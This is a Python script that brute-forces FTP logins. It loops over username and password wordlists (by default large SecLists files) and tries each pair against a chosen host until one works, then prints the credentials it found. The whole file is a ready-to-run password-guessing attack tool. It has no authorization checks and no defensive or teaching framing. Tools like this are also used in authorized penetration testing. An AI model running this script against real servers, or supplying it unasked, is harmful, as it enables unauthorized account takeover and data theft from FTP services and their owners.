import argparse
import ftplib
import socket

try:
    import progressbar
except ImportError:
    progressbar = None


DEFAULT_USERNAME_FILE = 'usuarios.txt'
DEFAULT_PASSWORD_FILE = 'passwords.txt'
DEFAULT_USERNAME_FALLBACK = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
DEFAULT_PASSWORD_FALLBACK = '/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt'


def load_wordlist(path: str, fallback: str) -> list[str]:
    for candidate in (path, fallback):
        if not candidate:
            continue
        try:
            with open(candidate, 'r', encoding='utf-8', errors='ignore') as handle:
                lines = [line.strip() for line in handle if line.strip()]
        except (FileNotFoundError, PermissionError):
            continue

        if lines:
            return lines

    return []


def ftp_attack(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(host=host, port=port, timeout=timeout)
            ftp.login(username, password)
        return True
    except ftplib.error_perm:
        return False
    except (socket.timeout, ConnectionRefusedError, OSError, ftplib.error_temp, ftplib.error_proto) as exc:
        raise RuntimeError(f'FTP connection failed: {exc}') from exc


def create_progress_bar(total: int):
    if progressbar is None or total <= 0:
        return None

    widgets = [
        'Progress: ',
        progressbar.Percentage(),
        ' ',
        progressbar.Bar(marker=':'),
        ' ',
        progressbar.ETA(),
        ' | ',
        progressbar.Counter('%d/' + str(total)),
        ' || ',
        progressbar.Timer(),
    ]

    try:
        bar = progressbar.ProgressBar(widgets=widgets, max_value=total)
    except TypeError:
        bar = progressbar.ProgressBar(widgets=widgets, maxval=total)

    return bar.start()


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='FTP brute force helper')
    parser.add_argument('host', nargs='?', help='FTP host or IP address')
    parser.add_argument('--port', type=int, default=21, help='FTP port (default: 21)')
    parser.add_argument('--username', help='Single username to test')
    parser.add_argument('--password', help='Single password to test')
    parser.add_argument('--user-file', default=DEFAULT_USERNAME_FILE, help='Username wordlist file')
    parser.add_argument('--pass-file', default=DEFAULT_PASSWORD_FILE, help='Password wordlist file')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds')
    return parser.parse_args()


def main() -> int:
    args = parse_arguments()

    host = args.host
    if not host:
        host = input('Type the FTP host or IP -> ').strip()
    if not host:
        print('Host is required.')
        return 1

    if args.username:
        users = [args.username.strip()]
    else:
        if 'y' in input('Do you know the user? (y/n) -> ').strip().lower():
            users = [input('Type the username that you know -> ').strip()]
        else:
            users = load_wordlist(args.user_file, DEFAULT_USERNAME_FALLBACK)

    if args.password:
        passwords = [args.password.strip()]
    else:
        if 'y' in input('Do you know the password? (y/n) -> ').strip().lower():
            passwords = [input('Type the password that you know -> ').strip()]
        else:
            passwords = load_wordlist(args.pass_file, DEFAULT_PASSWORD_FALLBACK)

    users = [u for u in (users or []) if u]
    passwords = [p for p in (passwords or []) if p]

    if not users:
        print('No valid usernames available to test.')
        return 1
    if not passwords:
        print('No valid passwords available to test.')
        return 1

    total = len(users) * len(passwords)
    bar = create_progress_bar(total)

    count = 0
    found = False
    for username in users:
        for password in passwords:
            count += 1
            if bar is not None:
                try:
                    bar.update(count)
                except AttributeError:
                    bar(count)
            elif count % 100 == 0 or count == total:
                print(f'Tested {count}/{total}')

            try:
                if ftp_attack(host, args.port, username, password, timeout=args.timeout):
                    print(
                        f"¡¡SUCCESFULL LOGIN!! The user is '{username}' and the password is '{password}'"
                    )
                    found = True
                    break
            except RuntimeError as exc:
                if bar is not None:
                    try:
                        bar.finish()
                    except Exception:
                        pass
                print(exc)
                return 1

        if found:
            break

    if bar is not None:
        try:
            bar.finish()
        except Exception:
            pass

    if not found:
        print('No valid credentials were found.')

    return 0


if __name__ == '__main__':
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print('\n\n(Bye...)\n')
